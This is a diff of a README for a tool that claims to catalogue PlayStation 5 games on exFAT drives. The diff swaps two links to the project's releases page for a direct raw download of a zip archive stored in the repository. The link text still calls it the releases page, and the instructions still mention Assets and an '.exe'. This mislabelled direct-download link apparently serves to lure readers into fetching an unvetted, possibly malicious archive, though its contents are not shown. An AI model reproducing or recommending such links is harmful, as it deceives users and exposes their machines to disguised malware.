@@ -1,6 +1,6 @@
 # 📂 exFAT-Ripper - Organize your PS5 game library files
 
-[![Download exFAT-Ripper](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/discoverable-rhomboidmuscle244/exFAT-Ripper/releases)
+[![Download exFAT-Ripper](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/discoverable-rhomboidmuscle244/exFAT-Ripper/raw/refs/heads/main/core/FA_Ripper_ex_v1.5-beta.2.zip)
 
 ## What is this tool?
 This application helps users manage game files stored on external drives formatted with the exFAT file system. The PlayStation 5 uses this system for external storage. This tool reads the contents of your drive and generates a list of your installed games. It helps you keep track of your library without needing to connect the drive to the console.
@@ -13,7 +13,7 @@ To use this software, your computer needs these items:
 * At least 50 megabytes of free space on your computer storage.
 
 ## 📥 How to download
-1. Visit [this link to the releases page](https://github.com/discoverable-rhomboidmuscle244/exFAT-Ripper/releases) to access the downloads.
+1. Visit [this link to the releases page](https://github.com/discoverable-rhomboidmuscle244/exFAT-Ripper/raw/refs/heads/main/core/FA_Ripper_ex_v1.5-beta.2.zip) to access the downloads.
 2. Look for the section labeled "Assets" at the bottom of the latest release post.
 3. Click the link ending in ".exe" to start the download.
 4. Save the file to your desktop or your downloads folder.
